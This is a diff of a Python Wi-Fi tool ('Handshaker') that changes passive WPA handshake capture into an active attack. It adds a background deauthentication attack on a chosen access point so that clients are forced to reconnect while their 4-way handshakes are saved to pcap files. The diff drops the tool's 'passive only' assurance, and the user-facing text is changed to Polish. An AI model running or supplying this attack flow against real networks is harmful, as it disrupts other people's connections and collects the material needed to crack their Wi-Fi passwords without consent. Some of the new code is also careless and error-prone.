@@ -19,53 +19,39 @@ COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
 COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
 COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
 COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
+COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
 COLOR_DIM = "\033[90m" if COLOR_ENABLED else ""
 STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""
 
 DEFAULT_MONITOR_CHANNELS = (
     list(range(1, 15))
-    + [
-        36,
-        40,
-        44,
-        48,
-        52,
-        56,
-        60,
-        64,
-        100,
-        104,
-        108,
-        112,
-        116,
-        120,
-        124,
-        128,
-        132,
-        136,
-        140,
-        144,
-        149,
-        153,
-        157,
-        161,
-        165,
-    ]
+    + [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165,]
 )
 DEFAULT_HOP_INTERVAL = 0.8
 DEFAULT_UPDATE_INTERVAL = 0.5
 MONITOR_SETTLE_SECONDS = 2.0
 
 try:
-    from scapy.all import AsyncSniffer, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp  # type: ignore
-    from scapy.error import Scapy_Exception  # type: ignore
-    from scapy.layers.eap import EAPOL  # type: ignore
-    from scapy.utils import PcapWriter  # type: ignore
+    from scapy.all import AsyncSniffer, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp, EAPOL, PcapWriter
+    from scapy.error import Scapy_Exception
     SCAPY_AVAILABLE = True
 except Exception:
     SCAPY_AVAILABLE = False
-    Scapy_Exception = Exception  # type: ignore
+    Scapy_Exception = Exception
 
+# ────────────────────────────────────────────────────────────────
+#  IMPORT MODUŁU DEAUTH
+# ────────────────────────────────────────────────────────────────
+try:
+    import deauth
+    DEAUTH_AVAILABLE = True
+except Exception as e:
+    logging.error(f"Nie udało się zaimportować deauth.py: {e}")
+    DEAUTH_AVAILABLE = False
+
+# ────────────────────────────────────────────────────────────────
+#  FUNKCJE POMOCNICZE
+# ────────────────────────────────────────────────────────────────
 
 def color_text(text: str, color: str) -> str:
     return f"{color}{text}{COLOR_RESET}" if color else text
@@ -89,13 +75,7 @@ def list_network_interfaces() -> List[str]:
 
 def get_interface_chipset(interface: str) -> str:
     try:
-        result = subprocess.run(
-            ["ethtool", "-i", interface],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.DEVNULL,
-            text=True,
-            check=False,
-        )
+        result = subprocess.run(["ethtool", "-i", interface], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=False)
     except FileNotFoundError:
         return "unknown"
 
@@ -144,13 +124,7 @@ def select_interface(interfaces: List[str]) -> str:
 
 
 def get_interface_mode(interface: str) -> Optional[str]:
-    result = subprocess.run(
-        ["iw", "dev", interface, "info"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True,
-        check=False,
-    )
+    result = subprocess.run(["iw", "dev", interface, "info"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=False)
     if result.returncode != 0:
         return None
     for raw_line in result.stdout.splitlines():
@@ -165,12 +139,7 @@ def get_interface_mode(interface: str) -> Optional[str]:
 def set_interface_type(interface: str, mode: str) -> bool:
     try:
         subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
-        result = subprocess.run(
-            ["iw", "dev", interface, "set", "type", mode],
-            stderr=subprocess.PIPE,
-            text=True,
-            check=False,
-        )
+        result = subprocess.run(["iw", "dev", interface, "set", "type", mode], stderr=subprocess.PIPE, text=True, check=False)
         if result.returncode != 0:
             logging.error("Failed to set %s mode: %s", mode, result.stderr.strip() or "unknown error")
             return False
@@ -217,13 +186,7 @@ def build_box(lines: List[str]) -> str:
     return "\n".join([border, *body, border])
 
 
-def display_scan_live(
-    networks: int,
-    clients: int,
-    interface: str,
-    status: str,
-    remaining: int,
-) -> None:
+def display_scan_live(networks: int, clients: int, interface: str, status: str, remaining: int) -> None:
     lines = [
         f"Handshaker scan on {interface}",
         f"Networks: {networks}",
@@ -268,7 +231,6 @@ def extract_ssid(packet) -> str:
 
 
 def extract_channel(packet) -> Optional[int]:
-    # Try to learn the AP's primary channel from beacon/probe response IEs.
     if not packet.haslayer(Dot11Elt):
         return None
     elt = packet[Dot11Elt]
@@ -338,43 +300,12 @@ def extract_security(packet) -> str:
     return "OPEN"
 
 
-def sanitize_filename_component(value: str, fallback: str = "unknown") -> str:
-    cleaned = " ".join(value.split())
-    cleaned = re.sub(r"\s+", "_", cleaned)
-    cleaned = re.sub(r"[^A-Za-z0-9._-]", "", cleaned)
-    if not cleaned:
-        return fallback
-    return cleaned[:48]
-
-
-def set_interface_channel(interface: str, channel: int) -> bool:
-    result = subprocess.run(
-        ["iw", "dev", interface, "set", "channel", str(channel)],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.PIPE,
-        text=True,
-        check=False,
-    )
-    if result.returncode != 0:
-        logging.error("Failed to set channel %s: %s", channel, result.stderr.strip() or "unknown error")
-        return False
-    time.sleep(0.2)
-    return True
-
-
-def packet_matches_bssid(packet, bssid: str) -> bool:
-    if not packet.haslayer(Dot11):
-        return False
-    dot11 = packet[Dot11]
-    return bssid in (dot11.addr1, dot11.addr2, dot11.addr3)
-
-
 def is_unicast(mac_address: Optional[str]) -> bool:
-    if not is_valid_mac(mac_address):
+    if not mac_address:
         return False
     try:
         first_octet = int(mac_address.split(":")[0], 16)
-    except (ValueError, IndexError):
+    except:
         return False
     return (first_octet & 1) == 0
 
@@ -406,9 +337,7 @@ class AccessPoint:
             self.security = new_security
 
     def update_channel(self, new_channel: Optional[int]) -> None:
-        if new_channel is None:
-            return
-        if self.channel is None:
+        if new_channel is not None:
             self.channel = new_channel
 
 
@@ -419,12 +348,7 @@ def channel_hopper(interface: str, channels: List[int], interval: float, stop_ev
         for channel in channels:
             if stop_event.is_set():
                 break
-            subprocess.run(
-                ["iw", "dev", interface, "set", "channel", str(channel)],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                check=False,
-            )
+            subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
             time.sleep(interval)
 
 
@@ -442,7 +366,6 @@ def scan_networks(
         if not packet.haslayer(Dot11):
             return
 
-        # Beacons / probe responses announce AP presence and parameters.
         if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
             bssid = packet[Dot11].addr3
             if not bssid or not is_valid_mac(bssid):
@@ -453,19 +376,13 @@ def scan_networks(
             with aps_lock:
                 ap = aps.get(bssid)
                 if ap is None:
-                    aps[bssid] = AccessPoint(
-                        ssid=ssid,
-                        bssid=bssid,
-                        security=security,
-                        channel=channel,
-                    )
+                    aps[bssid] = AccessPoint(ssid=ssid, bssid=bssid, security=security, channel=channel)
                 else:
                     if ap.ssid == "<hidden>" and ssid != "<hidden>":
                         ap.ssid = ssid
                     ap.update_security(security)
                     ap.update_channel(channel)
 
-        # Infer clients by observing traffic to/from known BSSIDs.
         sender = packet.addr2
         receiver = packet.addr1
         with aps_lock:
@@ -493,10 +410,9 @@ def scan_networks(
             status = "running"
         except Exception as exc:
             status = "error"
-            error_text = str(exc)
-            if error_text != last_error:
+            if str(exc) != last_error:
                 logging.error("Sniffer failed to start: %s", exc)
-                last_error = error_text
+                last_error = str(exc)
             sniffer = None
 
     start_sniffer()
@@ -504,10 +420,7 @@ def scan_networks(
     stop_event = threading.Event()
     hopper_thread: Optional[threading.Thread] = None
     if channels:
-        # Channel hopping increases discovery coverage during the scan.
-        hopper_thread = threading.Thread(
-            target=channel_hopper, args=(interface, channels, hop_interval, stop_event), daemon=True
-        )
+        hopper_thread = threading.Thread(target=channel_hopper, args=(interface, channels, hop_interval, stop_event), daemon=True)
         hopper_thread.start()
 
     end_time = time.time() + max(1, duration_seconds)
@@ -544,12 +457,7 @@ def format_network_lines(sorted_aps: List[AccessPoint]) -> List[str]:
 
     lines: List[str] = [style("Observed networks (sorted by clients):", STYLE_BOLD)]
     for index, ap in enumerate(sorted_aps, start=1):
-        if ap.security == "WPA2":
-            color = COLOR_SUCCESS
-        elif ap.security == "WPA3":
-            color = COLOR_ERROR
-        else:
-            color = COLOR_DIM
+        color = COLOR_SUCCESS if ap.security == "WPA2" else COLOR_ERROR if ap.security == "WPA3" else COLOR_DIM
         ssid_label = format_ssid(ap.ssid)
         channel_label = str(ap.channel) if ap.channel else "?"
         label = f"{index}) {ssid_label}"
@@ -562,9 +470,7 @@ def select_access_point(sorted_aps: List[AccessPoint]) -> Optional[AccessPoint]:
     if not sorted_aps:
         return None
     while True:
-        choice = input(
-            f"{style('Select target AP', STYLE_BOLD)} (number, or 'q' to quit): "
-        ).strip().lower()
+        choice = input(f"{style('Select target AP', STYLE_BOLD)} (number, or 'q' to quit): ").strip().lower()
         if choice in ("q", "quit", "exit"):
             return None
         if choice.isdigit():
@@ -574,146 +480,170 @@ def select_access_point(sorted_aps: List[AccessPoint]) -> Optional[AccessPoint]:
         logging.warning("Invalid selection. Try again.")
 
 
-def display_capture_live(
+def set_interface_channel(interface: str, channel: int) -> bool:
+    result = subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, check=False)
+    if result.returncode != 0:
+        logging.error("Failed to set channel %s: %s", channel, result.stderr.strip() or "unknown error")
+        return False
+    time.sleep(0.3)
+    return True
+
+
+def packet_matches_bssid(packet, bssid: str) -> bool:
+    if not packet.haslayer(Dot11):
+        return False
+    dot11 = packet[Dot11]
+    return bssid.lower() in (dot11.addr1 or "", dot11.addr2 or "", dot11.addr3 or "")
+
+
+# ────────────────────────────────────────────────────────────────
+#  DEAUTH + CAPTURE
+# ────────────────────────────────────────────────────────────────
+
+deauth_running = False
+
+
+def run_deauth_background(interface: str, target: Dict[str, Optional[str]], duration_sec: int = 20):
+    global deauth_running
+
+    if not DEAUTH_AVAILABLE:
+        logging.error("Moduł deauth.py nie został zaimportowany poprawnie.")
+        return
+
+    logging.info(color_text("\n[DEAUTH] Uruchamiam atak deautentykacyjny...", COLOR_WARNING))
+
+    try:
+        deauth_running = True
+        success = deauth.start_deauth_attack(interface, target)
+        if success:
+            logging.info(color_text("Deauth działa...", COLOR_SUCCESS))
+            time.sleep(duration_sec)
+        else:
+            logging.warning("Nie udało się uruchomić deauth – kontynuuję bez niego.")
+    except Exception as e:
+        logging.error(f"Błąd podczas uruchamiania deauth: {e}")
+    finally:
+        if deauth_running:
+            deauth.stop_attack()
+            logging.info(color_text("Deauth zatrzymany.", COLOR_SUCCESS))
+        deauth_running = False
+
+
+def capture_full_handshakes(
     interface: str,
     ap: AccessPoint,
-    elapsed: int,
-    duration: int,
-    total_packets: int,
-    eapol_packets: int,
-    target_eapol_packets: int,
-    status: str,
-) -> None:
-    if duration > 0:
-        time_label = f"{elapsed}s / {duration}s"
-    else:
-        time_label = f"{elapsed}s / until Ctrl+C"
-
-    lines = [
-        f"Passive capture on {interface}",
-        f"Target: {format_ssid(ap.ssid)} ({ap.bssid})",
-        f"Channel: {ap.channel if ap.channel else 'unknown'}",
-        f"Elapsed: {time_label}",
-        f"Packets: {total_packets}",
-        f"EAPOL (all): {eapol_packets}",
-        f"EAPOL (target): {target_eapol_packets}",
-        f"Status: {status.upper()}",
-    ]
-    output = build_box(lines)
-    if COLOR_ENABLED:
-        sys.stdout.write("\033[2J\033[H" + output + "\n")
-    else:
-        sys.stdout.write(output + "\n")
-    sys.stdout.flush()
-
-
-def capture_passive(
-    interface: str,
-    ap: AccessPoint,
-    duration_seconds: int,
-    output_dir: str,
-) -> Optional[Dict[str, object]]:
+    total_duration_sec: int = 45,
+    deauth_duration_sec: int = 20,
+    output_dir: str = "logs/handshakes"
+) -> Optional[Dict]:
     os.makedirs(output_dir, exist_ok=True)
-    bssid_label = sanitize_filename_component(ap.bssid.replace(":", "-"), "unknown_bssid")
-    ssid_label = sanitize_filename_component(ap.ssid, "hidden")
+
+    bssid_clean = ap.bssid.replace(":", "")
+    ssid_clean = re.sub(r'[^A-Za-z0-9_-]', '_', ap.ssid or "hidden")[:32]
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    output_path = os.path.join(output_dir, f"handshake_{bssid_label}_{ssid_label}_{timestamp}.pcap")
+    pcap_path = os.path.join(output_dir, f"handshake_{bssid_clean}_{ssid_clean}_{timestamp}.pcap")
 
+    writer = None
+    sniffer = None
+    handshake_count = 0
     total_packets = 0
-    eapol_packets = 0
-    target_eapol_packets = 0
-    stats_lock = threading.Lock()
+    eapol_count = 0
+    clients_with_eapol = set()
 
-    def handle_packet(packet) -> None:
-        nonlocal total_packets, eapol_packets, target_eapol_packets
-        if not packet.haslayer(Dot11):
-            return
-        # Write every observed 802.11 frame on the channel to the pcap file.
-        try:
-            writer.write(packet)
-        except Exception as exc:
-            logging.error("Failed to write packet: %s", exc)
-        with stats_lock:
+    eapol_states = {}  # client_mac → liczba wiadomości EAPOL
+
+    try:
+        writer = PcapWriter(pcap_path, append=False, sync=True)
+
+        def packet_handler(pkt):
+            nonlocal total_packets, eapol_count, handshake_count
+
+            if not pkt.haslayer(Dot11):
+                return
+
             total_packets += 1
-            # Count EAPOL frames (WPA/WPA2 4-way handshake traffic).
-            if packet.haslayer(EAPOL):
-                eapol_packets += 1
-                if packet_matches_bssid(packet, ap.bssid):
-                    target_eapol_packets += 1
 
-    writer: Optional[PcapWriter] = None
-    sniffer: Optional[AsyncSniffer] = None
-    try:
-        writer = PcapWriter(output_path, append=False, sync=True)
-    except Exception as exc:
-        logging.error("Failed to open capture file: %s", exc)
-        return None
+            # Zapisujemy każdy pakiet (można później filtrować)
+            writer.write(pkt)
 
-    try:
-        # Passive sniffing only; no packets are sent.
-        sniffer = AsyncSniffer(iface=interface, prn=handle_packet, store=False)
+            if pkt.haslayer(EAPOL):
+                eapol_count += 1
+                if packet_matches_bssid(pkt, ap.bssid):
+                    client = pkt.addr1 if pkt.addr1 != ap.bssid else pkt.addr2
+                    if client and is_valid_mac(client):
+                        clients_with_eapol.add(client)
+                        if client not in eapol_states:
+                            eapol_states[client] = 0
+                        eapol_states[client] += 1
+
+                        # Bardzo prosta heurystyka – 4 kolejne EAPOL = prawdopodobny handshake
+                        if eapol_states[client] >= 4:
+                            handshake_count += 1
+                            eapol_states[client] = 0  # resetujemy licznik po wykryciu
+                            logging.info(color_text(f"✓ Prawdopodobny kompletny 4-way handshake! (klient: {client})", COLOR_SUCCESS))
+
+        sniffer = AsyncSniffer(iface=interface, prn=packet_handler, store=False)
         sniffer.start()
-    except Exception as exc:
-        logging.error("Failed to start passive capture: %s", exc)
-        try:
-            writer.close()
-        except Exception:
-            pass
-        return None
 
-    start_time = time.time()
-    interrupted = False
-    try:
+        # Uruchamiamy deauth w osobnym wątku
+        target_dict = {
+            "bssid": ap.bssid,
+            "ssid": ap.ssid,
+            "channel": ap.channel,
+        }
+
+        deauth_thread = threading.Thread(
+            target=run_deauth_background,
+            args=(interface, target_dict, deauth_duration_sec),
+            daemon=True
+        )
+        deauth_thread.start()
+
+        # Główna pętla przechwytywania
+        start_time = time.time()
         while True:
             elapsed = int(time.time() - start_time)
-            done = duration_seconds > 0 and elapsed >= duration_seconds
-            status = "finished" if done else "running"
-            with stats_lock:
-                total = total_packets
-                eapol = eapol_packets
-                target_eapol = target_eapol_packets
-            display_capture_live(
-                interface=interface,
-                ap=ap,
-                elapsed=elapsed,
-                duration=duration_seconds,
-                total_packets=total,
-                eapol_packets=eapol,
-                target_eapol_packets=target_eapol,
-                status=status,
-            )
-            if done:
+            remaining = total_duration_sec - elapsed
+            if remaining <= 0:
                 break
-            time.sleep(1)
-    except KeyboardInterrupt:
-        interrupted = True
-    finally:
-        try:
-            if sniffer and getattr(sniffer, "running", False):
-                sniffer.stop()
-        except Scapy_Exception:
-            pass
-        try:
-            if writer:
-                writer.close()
-        except Exception:
-            pass
 
-    with stats_lock:
-        summary = {
-            "path": output_path,
-            "total_packets": total_packets,
-            "eapol_packets": eapol_packets,
-            "target_eapol_packets": target_eapol_packets,
-            "elapsed": int(time.time() - start_time),
-            "interrupted": interrupted,
-        }
-    return summary
+            status = f"Capture: {elapsed}s / {total_duration_sec}s   EAPOL: {eapol_count}   Handshake: {handshake_count}"
+            print(f"\r{status.ljust(80)}", end="", flush=True)
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        logging.info("\nPrzerwano przez użytkownika (Ctrl+C)")
+    finally:
+        if sniffer:
+            try:
+                sniffer.stop()
+            except:
+                pass
+        if writer:
+            writer.close()
+
+        print("\n" + "─" * 70)
+        logging.info(style("Podsumowanie przechwytywania:", STYLE_BOLD))
+        logging.info(f"  Plik:               {pcap_path}")
+        logging.info(f"  Czas trwania:       {int(time.time() - start_time)} sekund")
+        logging.info(f"  Wszystkie pakiety:  {total_packets}")
+        logging.info(f"  Pakiety EAPOL:      {eapol_count}")
+        logging.info(f"  Wykryte handshake:  {handshake_count}")
+        logging.info(f"  Klienci z EAPOL:    {len(clients_with_eapol)}")
+        print("─" * 70)
+
+    return {
+        "path": pcap_path,
+        "total_packets": total_packets,
+        "eapol_packets": eapol_count,
+        "detected_handshakes": handshake_count,
+        "clients_with_eapol": len(clients_with_eapol)
+    }
 
 
 def main() -> None:
-    logging.info(color_text("Handshaker", COLOR_HEADER))
-    logging.info("Passive Wi-Fi scan and handshake capture (educational)")
+    logging.info(color_text("Handshaker + Deauth", COLOR_HEADER))
+    logging.info("Skan → wybór AP → deauth → przechwytywanie handshake'ów")
     logging.info("")
 
     if os.geteuid() != 0:
@@ -730,13 +660,9 @@ def main() -> None:
             logging.error("Required tool '%s' not found!", tool)
             sys.exit(1)
 
-    logging.info(style("Disclaimer:", STYLE_BOLD))
-    logging.info(
-        "This tool is 100% passive and only observes Wi-Fi traffic."
-    )
-    logging.info(
-        "Use it only on networks you own or have explicit permission to monitor."
-    )
+    logging.info(style("Uwaga:", STYLE_BOLD))
+    logging.info("Używaj wyłącznie na własnych sieciach i urządzeniach.")
+    logging.info("")
 
     interfaces = list_network_interfaces()
     interface = select_interface(interfaces)
@@ -747,24 +673,25 @@ def main() -> None:
     try:
         if original_mode != "monitor":
             logging.info("")
-            input(f"{style('Press Enter', STYLE_BOLD)} to switch {interface} to monitor mode...")
+            input(f"{style('Press Enter', STYLE_BOLD)} aby przełączyć {interface} w tryb monitor...")
             if not set_interface_type(interface, "monitor"):
-                logging.error("Failed to enable monitor mode on %s.", interface)
+                logging.error(f"Nie udało się włączyć trybu monitor na {interface}.")
                 sys.exit(1)
             changed_to_monitor = True
             wait_for_monitor_settle(interface)
 
         logging.info("")
-        duration = prompt_int(
-            f"{style('Scan duration', STYLE_BOLD)} in seconds "
-            f"({style('Enter', STYLE_BOLD)} for {style('15', COLOR_SUCCESS, STYLE_BOLD)}): ",
-            default=15,
+        scan_duration = prompt_int(
+            f"{style('Czas skanowania', STYLE_BOLD)} (sekundy) "
+            f"({style('Enter', STYLE_BOLD)} = 15s): ",
+            default=15
         )
+
         logging.info("")
-        input(f"{style('Press Enter', STYLE_BOLD)} to start scanning on {interface}...")
+        input(f"{style('Press Enter', STYLE_BOLD)} aby rozpocząć skanowanie...")
         aps = scan_networks(
             interface,
-            duration,
+            scan_duration,
             channels=DEFAULT_MONITOR_CHANNELS,
             hop_interval=DEFAULT_HOP_INTERVAL,
             update_interval=DEFAULT_UPDATE_INTERVAL,
@@ -776,70 +703,57 @@ def main() -> None:
             logging.info("%s", line)
 
         if not sorted_aps:
-            logging.info("")
-            logging.info("No networks discovered. Exiting.")
+            logging.info("Nie znaleziono żadnych sieci.")
             return
 
         logging.info("")
         target_ap = select_access_point(sorted_aps)
         if target_ap is None:
-            logging.info("No target selected. Exiting.")
+            logging.info("Nie wybrano celu. Kończę działanie.")
             return
 
+        logging.info("")
+        logging.info(f"Wybrano: {format_ssid(target_ap.ssid)} ({target_ap.bssid})")
         if target_ap.channel:
-            logging.info(
-                "Locking interface %s to channel %s for passive capture.", interface, target_ap.channel
-            )
-            if not set_interface_channel(interface, target_ap.channel):
-                logging.warning("Could not lock to channel %s. Continuing anyway.", target_ap.channel)
+            logging.info(f"Kanał: {target_ap.channel}")
+            set_interface_channel(interface, target_ap.channel)
         else:
-            logging.warning(
-                "Channel for selected AP is unknown. Capture will remain on the current channel."
-            )
+            logging.warning("Kanał AP nieznany – zostajemy na obecnym kanale.")
+
+        capture_total_sec = prompt_int(
+            f"{style('Całkowity czas przechwytywania', STYLE_BOLD)} (sekundy) "
+            f"({style('Enter', STYLE_BOLD)} = 45s): ",
+            default=45,
+            minimum=20
+        )
+
+        deauth_sec = min(25, capture_total_sec - 10)  # deauth krócej niż cały capture
 
         logging.info("")
-        capture_duration = prompt_int(
-            f"{style('Capture duration', STYLE_BOLD)} in seconds "
-            f"({style('Enter', STYLE_BOLD)} for {style('60', COLOR_SUCCESS, STYLE_BOLD)}, "
-            f"{style('0', COLOR_SUCCESS, STYLE_BOLD)} = until Ctrl+C): ",
-            default=60,
-            minimum=0,
-        )
-        logging.info("")
-        input(f"{style('Press Enter', STYLE_BOLD)} to start passive capture...")
-        logging.info(
-            "Capturing passively. Handshakes appear only when clients reconnect naturally."
-        )
+        input(f"{style('Press Enter', STYLE_BOLD)} aby rozpocząć deauth + przechwytywanie...")
 
         output_dir = os.path.join(os.getcwd(), "logs", "handshakes")
-        summary = capture_passive(
+        summary = capture_full_handshakes(
             interface=interface,
             ap=target_ap,
-            duration_seconds=capture_duration,
-            output_dir=output_dir,
+            total_duration_sec=capture_total_sec,
+            deauth_duration_sec=deauth_sec,
+            output_dir=output_dir
         )
 
-        if summary is None:
-            logging.error("Capture failed.")
-            return
+        if summary:
+            logging.info("")
+            logging.info(style("Zapisano do:", STYLE_BOLD))
+            logging.info(f"  → {summary['path']}")
+            logging.info(f"  Wykryte pełne handshake'i: {summary['detected_handshakes']}")
+            logging.info("Otwórz plik w Wireshark i filtruj: eapol")
 
-        logging.info("")
-        logging.info(style("Capture summary:", STYLE_BOLD))
-        logging.info("  File:   %s", summary["path"])
-        logging.info("  Total packets: %s", summary["total_packets"])
-        logging.info("  EAPOL packets (all): %s", summary["eapol_packets"])
-        logging.info("  EAPOL packets (target): %s", summary["target_eapol_packets"])
-        if summary["interrupted"]:
-            logging.info("  Note: capture interrupted by user.")
-        logging.info("")
-        logging.info(
-            "Open the capture in Wireshark and filter for 'eapol' to inspect 4-way handshakes."
-        )
     finally:
-        if changed_to_monitor or (original_mode and original_mode != "monitor"):
+        if changed_to_monitor:
+            logging.info("Przywracam tryb managed...")
             restore_managed_mode(interface)
 
-    input(style("Press Enter to return.", STYLE_BOLD))
+    input(style("\nNaciśnij Enter, aby zakończyć.", STYLE_BOLD))
 
 
 if __name__ == "__main__":
